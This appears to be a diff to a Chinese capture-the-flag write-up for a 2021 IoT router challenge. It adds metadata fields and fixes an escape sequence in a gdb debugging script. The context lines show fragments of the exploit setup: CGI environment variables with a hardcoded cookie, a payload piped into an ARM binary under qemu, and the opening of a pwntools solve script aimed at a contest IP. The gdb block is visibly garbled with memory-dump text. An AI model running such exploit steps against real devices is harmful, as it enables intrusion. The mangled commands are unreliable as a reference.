@@ -80,6 +80,9 @@ prerequisites:
 - dfu-util 刷机流程
 - MQTT 协议（mosquitto）
 - UART 串口调试
+contest_normalized: "西湖论剑"
+contest_year: 2021
+subcategory_guess: "kernel"
 ---
 # 2021西湖论剑IOT RW-WriteUp
 
@@ -509,7 +512,7 @@ gdb-multiarch ./55.cgi -x xgdb.sh
 
 其中 xgdb.sh 如下
 
-set architecture arm │0x407ff6d4: 'C' <repeats 200 times>...set endian little │0x407ff79c: 'C' <repeats 200 times>... │0x407ff864: 'C' <repeats 160 times>, "334t 01"b *0x10B34 │0x407ff908: ""b *0x10B44 │0x407ff909: ""target remote 127.0.0.1:
+set architecture arm │0x407ff6d4: 'C' <repeats 200 times>...set endian little │0x407ff79c: 'C' <repeats 200 times>... │0x407ff864: 'C' <repeats 160 times>, "334t\\x0001"b *0x10B34 │0x407ff908: ""b *0x10B44 │0x407ff909: ""target remote 127.0.0.1:
 1234
 
 3. 解题脚本
@@ -1169,7 +1172,7 @@ export REQUEST_METHOD=POSTexport HTTP_COOKIES='uuid=nocbtm@hatlab!!!'export CONT
 export REQUEST_METHOD=POSTexport HTTP_COOKIES='uuid=nocbtm@hatlab!!!'export CONTENT_LENGTH=3000export CONTENT_TYPE='application/x-www-form-urlencoded'
 cat payload.txt | ./qemu-arm-static -g 1234 -L /usr/arm-linux-gnueabi/ ./55.cgi
 gdb-multiarch ./55.cgi -x xgdb.sh
-set architecture arm │0x407ff6d4: 'C' <repeats 200 times>...set endian little │0x407ff79c: 'C' <repeats 200 times>... │0x407ff864: 'C' <repeats 160 times>, "334t 01"b *0x10B34 │0x407ff908: ""b *0x10B44 │0x407ff909: ""target remote 127.0.0.1:
+set architecture arm │0x407ff6d4: 'C' <repeats 200 times>...set endian little │0x407ff79c: 'C' <repeats 200 times>... │0x407ff864: 'C' <repeats 160 times>, "334t\\x0001"b *0x10B34 │0x407ff908: ""b *0x10B44 │0x407ff909: ""target remote 127.0.0.1:
 1234
 import requests from pwn import * import binascii
 IP = "20.21.2.27"
